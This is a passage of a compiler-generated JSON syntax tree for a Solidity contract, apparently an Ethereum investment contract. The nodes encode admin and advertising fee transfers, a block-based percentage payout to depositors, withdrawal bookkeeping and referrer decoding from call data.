                              "typeDescriptions": {
                                "typeIdentifier": "t_magic_message",
                                "typeString": "msg"
                              }
                            },
                            "id": 139,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "value",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": null,
                            "src": "1090:9:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          {
                            "argumentTypes": null,
                            "hexValue": "3130",
                            "id": 140,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "kind": "number",
                            "lValueRequested": false,
                            "nodeType": "Literal",
                            "src": "1100:2:0",
                            "subdenomination": null,
                            "typeDescriptions": {
                              "typeIdentifier": "t_rational_10_by_1",
                              "typeString": "int_const 10"
                            },
                            "value": "10"
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            },
                            {
                              "typeIdentifier": "t_rational_10_by_1",
                              "typeString": "int_const 10"
                            }
                          ],
                          "id": 137,
                          "name": "mul",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 62,
                          "src": "1086:3:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
                            "typeString": "function (uint256,uint256) pure returns (uint256)"
                          }
                        },
                        "id": 141,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1086:17:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "argumentTypes": null,
                        "hexValue": "313030",
                        "id": 142,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1104:3:0",
                        "subdenomination": null,
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_100_by_1",
                          "typeString": "int_const 100"
                        },
                        "value": "100"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_100_by_1",
                          "typeString": "int_const 100"
                        }
                      ],
                      "id": 136,
                      "name": "div",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 76,
                      "src": "1082:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
                        "typeString": "function (uint256,uint256) pure returns (uint256)"
                      }
                    },
                    "id": 143,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1082:26:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "1064:44:0"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [
                      {
                        "argumentTypes": null,
                        "id": 148,
                        "name": "advPerc",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 135,
                        "src": "1133:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "argumentTypes": null,
                        "id": 145,
                        "name": "advAddress",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 7,
                        "src": "1113:10:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "id": 147,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "transfer",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": null,
                      "src": "1113:19:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
                        "typeString": "function (uint256)"
                      }
                    },
                    "id": 149,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1113:28:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 150,
                  "nodeType": "ExpressionStatement",
                  "src": "1113:28:0"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [
                      {
                        "argumentTypes": null,
                        "id": 154,
                        "name": "admRefPerc",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 124,
                        "src": "1165:10:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "argumentTypes": null,
                        "id": 151,
                        "name": "admAddress",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 4,
                        "src": "1145:10:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "id": 153,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "transfer",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": null,
                      "src": "1145:19:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
                        "typeString": "function (uint256)"
                      }
                    },
                    "id": 155,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1145:31:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 156,
                  "nodeType": "ExpressionStatement",
                  "src": "1145:31:0"
                },
                {
                  "condition": {
                    "argumentTypes": null,
                    "commonType": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    },
                    "id": 162,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "argumentTypes": null,
                      "baseExpression": {
                        "argumentTypes": null,
                        "id": 157,
                        "name": "deposited",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 11,
                        "src": "1185:9:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                          "typeString": "mapping(address => uint256)"
                        }
                      },
                      "id": 160,
                      "indexExpression": {
                        "argumentTypes": null,
                        "expression": {
                          "argumentTypes": null,
                          "id": 158,
                          "name": "msg",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 359,
                          "src": "1195:3:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_magic_message",
                            "typeString": "msg"
                          }
                        },
                        "id": 159,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "sender",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": null,
                        "src": "1195:10:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "isConstant": false,
                      "isLValue": true,
                      "isPure": false,
                      "lValueRequested": false,
                      "nodeType": "IndexAccess",
                      "src": "1185:21:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "!=",
                    "rightExpression": {
                      "argumentTypes": null,
                      "hexValue": "30",
                      "id": 161,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "1210:1:0",
                      "subdenomination": null,
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_0_by_1",
                        "typeString": "int_const 0"
                      },
                      "value": "0"
                    },
                    "src": "1185:26:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "falseBody": null,
                  "id": 214,
                  "nodeType": "IfStatement",
                  "src": "1181:338:0",
                  "trueBody": {
                    "id": 213,
                    "nodeType": "Block",
                    "src": "1213:306:0",
                    "statements": [
                      {
                        "assignments": [
                          164
                        ],
                        "declarations": [
                          {
                            "constant": false,
                            "id": 164,
                            "name": "investor",
                            "nodeType": "VariableDeclaration",
                            "scope": 269,
                            "src": "1218:16:0",
                            "stateVariable": false,
                            "storageLocation": "default",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            },
                            "typeName": {
                              "id": 163,
                              "name": "address",
                              "nodeType": "ElementaryTypeName",
                              "src": "1218:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            },
                            "value": null,
                            "visibility": "internal"
                          }
                        ],
                        "id": 167,
                        "initialValue": {
                          "argumentTypes": null,
                          "expression": {
                            "argumentTypes": null,
                            "id": 165,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 359,
                            "src": "1237:3:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 166,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "sender",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": null,
                          "src": "1237:10:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "nodeType": "VariableDeclarationStatement",
                        "src": "1218:29:0"
                      },
                      {
                        "assignments": [
                          169
                        ],
                        "declarations": [
                          {
                            "constant": false,
                            "id": 169,
                            "name": "depositsPercents",
                            "nodeType": "VariableDeclaration",
                            "scope": 269,
                            "src": "1252:24:0",
                            "stateVariable": false,
                            "storageLocation": "default",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            },
                            "typeName": {
                              "id": 168,
                              "name": "uint256",
                              "nodeType": "ElementaryTypeName",
                              "src": "1252:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            },
                            "value": null,
                            "visibility": "internal"
                          }
                        ],
                        "id": 192,
                        "initialValue": {
                          "argumentTypes": null,
                          "arguments": [
                            {
                              "argumentTypes": null,
                              "arguments": [
                                {
                                  "argumentTypes": null,
                                  "arguments": [
                                    {
                                      "argumentTypes": null,
                                      "arguments": [
                                        {
                                          "argumentTypes": null,
                                          "baseExpression": {
                                            "argumentTypes": null,
                                            "id": 174,
                                            "name": "deposited",
                                            "nodeType": "Identifier",
                                            "overloadedDeclarations": [],
                                            "referencedDeclaration": 11,
                                            "src": "1295:9:0",
                                            "typeDescriptions": {
                                              "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                                              "typeString": "mapping(address => uint256)"
                                            }
                                          },
                                          "id": 177,
                                          "indexExpression": {
                                            "argumentTypes": null,
                                            "expression": {
                                              "argumentTypes": null,
                                              "id": 175,
                                              "name": "msg",
                                              "nodeType": "Identifier",
                                              "overloadedDeclarations": [],
                                              "referencedDeclaration": 359,
                                              "src": "1305:3:0",
                                              "typeDescriptions": {
                                                "typeIdentifier": "t_magic_message",
                                                "typeString": "msg"
                                              }
                                            },
                                            "id": 176,
                                            "isConstant": false,
                                            "isLValue": false,
                                            "isPure": false,
                                            "lValueRequested": false,
                                            "memberName": "sender",
                                            "nodeType": "MemberAccess",
                                            "referencedDeclaration": null,
                                            "src": "1305:10:0",
                                            "typeDescriptions": {
                                              "typeIdentifier": "t_address",
                                              "typeString": "address"
                                            }
                                          },
                                          "isConstant": false,
                                          "isLValue": true,
                                          "isPure": false,
                                          "lValueRequested": false,
                                          "nodeType": "IndexAccess",
                                          "src": "1295:21:0",
                                          "typeDescriptions": {
                                            "typeIdentifier": "t_uint256",
                                            "typeString": "uint256"
                                          }
                                        },
                                        {
                                          "argumentTypes": null,
                                          "hexValue": "34",
                                          "id": 178,
                                          "isConstant": false,
                                          "isLValue": false,
                                          "isPure": true,
                                          "kind": "number",
                                          "lValueRequested": false,
                                          "nodeType": "Literal",
                                          "src": "1317:1:0",
                                          "subdenomination": null,
                                          "typeDescriptions": {
                                            "typeIdentifier": "t_rational_4_by_1",
                                            "typeString": "int_const 4"
                                          },
                                          "value": "4"
                                        }
                                      ],
                                      "expression": {
                                        "argumentTypes": [
                                          {
                                            "typeIdentifier": "t_uint256",
                                            "typeString": "uint256"
                                          },
                                          {
                                            "typeIdentifier": "t_rational_4_by_1",
                                            "typeString": "int_const 4"
                                          }
                                        ],
                                        "id": 173,
                                        "name": "mul",
                                        "nodeType": "Identifier",
                                        "overloadedDeclarations": [],
                                        "referencedDeclaration": 62,
                                        "src": "1291:3:0",
                                        "typeDescriptions": {
                                          "typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
                                          "typeString": "function (uint256,uint256) pure returns (uint256)"
                                        }
                                      },
                                      "id": 179,
                                      "isConstant": false,
                                      "isLValue": false,
                                      "isPure": false,
                                      "kind": "functionCall",
                                      "lValueRequested": false,
                                      "names": [],
                                      "nodeType": "FunctionCall",
                                      "src": "1291:28:0",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_uint256",
                                        "typeString": "uint256"
                                      }
                                    },
                                    {
                                      "argumentTypes": null,
                                      "hexValue": "313030",
                                      "id": 180,
                                      "isConstant": false,
                                      "isLValue": false,
                                      "isPure": true,
                                      "kind": "number",
                                      "lValueRequested": false,
                                      "nodeType": "Literal",
                                      "src": "1320:3:0",
                                      "subdenomination": null,
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_rational_100_by_1",
                                        "typeString": "int_const 100"
                                      },
                                      "value": "100"
                                    }
                                  ],
                                  "expression": {
                                    "argumentTypes": [
                                      {
                                        "typeIdentifier": "t_uint256",
                                        "typeString": "uint256"
                                      },
                                      {
                                        "typeIdentifier": "t_rational_100_by_1",
                                        "typeString": "int_const 100"
                                      }
                                    ],
                                    "id": 172,
                                    "name": "div",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": 76,
                                    "src": "1287:3:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
                                      "typeString": "function (uint256,uint256) pure returns (uint256)"
                                    }
                                  },
                                  "id": 181,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "kind": "functionCall",
                                  "lValueRequested": false,
                                  "names": [],
                                  "nodeType": "FunctionCall",
                                  "src": "1287:37:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  }
                                },
                                {
                                  "argumentTypes": null,
                                  "commonType": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  },
                                  "id": 188,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "leftExpression": {
                                    "argumentTypes": null,
                                    "expression": {
                                      "argumentTypes": null,
                                      "id": 182,
                                      "name": "block",
                                      "nodeType": "Identifier",
                                      "overloadedDeclarations": [],
                                      "referencedDeclaration": 349,
                                      "src": "1325:5:0",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_magic_block",
                                        "typeString": "block"
                                      }
                                    },
                                    "id": 183,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": false,
                                    "lValueRequested": false,
                                    "memberName": "number",
                                    "nodeType": "MemberAccess",
                                    "referencedDeclaration": null,
                                    "src": "1325:12:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  },
                                  "nodeType": "BinaryOperation",
                                  "operator": "-",
                                  "rightExpression": {
                                    "argumentTypes": null,
                                    "baseExpression": {
                                      "argumentTypes": null,
                                      "id": 184,
                                      "name": "blocklock",
                                      "nodeType": "Identifier",
                                      "overloadedDeclarations": [],
                                      "referencedDeclaration": 23,
                                      "src": "1338:9:0",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                                        "typeString": "mapping(address => uint256)"
                                      }
                                    },
                                    "id": 187,
                                    "indexExpression": {
                                      "argumentTypes": null,
                                      "expression": {
                                        "argumentTypes": null,
                                        "id": 185,
                                        "name": "msg",
                                        "nodeType": "Identifier",
                                        "overloadedDeclarations": [],
                                        "referencedDeclaration": 359,
                                        "src": "1348:3:0",
                                        "typeDescriptions": {
                                          "typeIdentifier": "t_magic_message",
                                          "typeString": "msg"
                                        }
                                      },
                                      "id": 186,
                                      "isConstant": false,
                                      "isLValue": false,
                                      "isPure": false,
                                      "lValueRequested": false,
                                      "memberName": "sender",
                                      "nodeType": "MemberAccess",
                                      "referencedDeclaration": null,
                                      "src": "1348:10:0",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_address",
                                        "typeString": "address"
                                      }
                                    },
                                    "isConstant": false,
                                    "isLValue": true,
                                    "isPure": false,
                                    "lValueRequested": false,
                                    "nodeType": "IndexAccess",
                                    "src": "1338:21:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  },
                                  "src": "1325:34:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  }
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  },
                                  {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  }
                                ],
                                "id": 171,
                                "name": "mul",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 62,
                                "src": "1283:3:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
                                  "typeString": "function (uint256,uint256) pure returns (uint256)"
                                }
                              },
                              "id": 189,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "kind": "functionCall",
                              "lValueRequested": false,
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "1283:77:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            },
                            {
                              "argumentTypes": null,
                              "hexValue": "35393030",
                              "id": 190,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "1361:4:0",
                              "subdenomination": null,
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_5900_by_1",
                                "typeString": "int_const 5900"
                              },
                              "value": "5900"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              },
                              {
                                "typeIdentifier": "t_rational_5900_by_1",
                                "typeString": "int_const 5900"
                              }
                            ],
                            "id": 170,
                            "name": "div",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 76,
                            "src": "1279:3:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
                              "typeString": "function (uint256,uint256) pure returns (uint256)"
                            }
                          },
                          "id": 191,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1279:87:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "nodeType": "VariableDeclarationStatement",
                        "src": "1252:114:0"
                      },
                      {
                        "expression": {
                          "argumentTypes": null,
                          "arguments": [
                            {
                              "argumentTypes": null,
                              "id": 196,
                              "name": "depositsPercents",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 169,
                              "src": "1389:16:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            ],
                            "expression": {
                              "argumentTypes": null,
                              "id": 193,
                              "name": "investor",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 164,
                              "src": "1371:8:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            },
                            "id": 195,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "transfer",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": null,
                            "src": "1371:17:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
                              "typeString": "function (uint256)"
                            }
                          },
                          "id": 197,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1371:35:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 198,
                        "nodeType": "ExpressionStatement",
                        "src": "1371:35:0"
                      },
                      {
                        "expression": {
                          "argumentTypes": null,
                          "id": 204,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftHandSide": {
                            "argumentTypes": null,
                            "baseExpression": {
                              "argumentTypes": null,
                              "id": 199,
                              "name": "withdrew",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 15,
                              "src": "1412:8:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                                "typeString": "mapping(address => uint256)"
                              }
                            },
                            "id": 202,
                            "indexExpression": {
                              "argumentTypes": null,
                              "expression": {
                                "argumentTypes": null,
                                "id": 200,
                                "name": "msg",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 359,
                                "src": "1421:3:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_magic_message",
                                  "typeString": "msg"
                                }
                              },
                              "id": 201,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "memberName": "sender",
                              "nodeType": "MemberAccess",
                              "referencedDeclaration": null,
                              "src": "1421:10:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            },
                            "isConstant": false,
                            "isLValue": true,
                            "isPure": false,
                            "lValueRequested": true,
                            "nodeType": "IndexAccess",
                            "src": "1412:20:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "Assignment",
                          "operator": "+=",
                          "rightHandSide": {
                            "argumentTypes": null,
                            "id": 203,
                            "name": "depositsPercents",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 169,
                            "src": "1436:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "src": "1412:40:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "id": 205,
                        "nodeType": "ExpressionStatement",
                        "src": "1412:40:0"
                      },
                      {
                        "expression": {
                          "argumentTypes": null,
                          "id": 211,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftHandSide": {
                            "argumentTypes": null,
                            "id": 206,
                            "name": "totalWithdrewWei",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 29,
                            "src": "1457:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "Assignment",
                          "operator": "=",
                          "rightHandSide": {
                            "argumentTypes": null,
                            "arguments": [
                              {
                                "argumentTypes": null,
                                "id": 208,
                                "name": "totalWithdrewWei",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 29,
                                "src": "1480:16:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                }
                              },
                              {
                                "argumentTypes": null,
                                "id": 209,
                                "name": "depositsPercents",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 169,
                                "src": "1497:16:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                },
                                {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                }
                              ],
                              "id": 207,
                              "name": "add",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 120,
                              "src": "1476:3:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
                                "typeString": "function (uint256,uint256) pure returns (uint256)"
                              }
                            },
                            "id": 210,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "functionCall",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "1476:38:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "src": "1457:57:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "id": 212,
                        "nodeType": "ExpressionStatement",
                        "src": "1457:57:0"
                      }
                    ]
                  }
                },
                {
                  "assignments": [
                    216
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 216,
                      "name": "referrer",
                      "nodeType": "VariableDeclaration",
                      "scope": 269,
                      "src": "1523:16:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      },
                      "typeName": {
                        "id": 215,
                        "name": "address",
                        "nodeType": "ElementaryTypeName",
                        "src": "1523:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "value": null,
                      "visibility": "internal"
                    }
                  ],
                  "id": 221,
                  "initialValue": {
                    "argumentTypes": null,
                    "arguments": [
                      {
                        "argumentTypes": null,
                        "expression": {
                          "argumentTypes": null,
                          "id": 218,
                          "name": "msg",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 359,
                          "src": "1557:3:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_magic_message",
                            "typeString": "msg"
                          }
                        },
                        "id": 219,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "data",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": null,
                        "src": "1557:8:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bytes_calldata_ptr",
                          "typeString": "bytes calldata"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bytes_calldata_ptr",
                          "typeString": "bytes calldata"
                        }
                      ],
                      "id": 217,
                      "name": "bytesToAddress",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 343,
                      "src": "1542:14:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_pure$_t_bytes_memory_ptr_$returns$_t_address_$",
                        "typeString": "function (bytes memory) pure returns (address)"
                      }
                    },
                    "id": 220,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1542:24:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "1523:43:0"
                },
                {
                  "condition": {
                    "argumentTypes": null,
                    "commonType": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    },
                    "id": 229,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "argumentTypes": null,
                      "commonType": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      },
                      "id": 224,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "leftExpression": {
                        "argumentTypes": null,
                        "id": 222,
                        "name": "referrer",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 216,
                        "src": "1574:8:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "nodeType": "BinaryOperation",
                      "operator": ">",
                      "rightExpression": {
                        "argumentTypes": null,
                        "hexValue": "307830",
                        "id": 223,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1585:3:0",
                        "subdenomination": null,
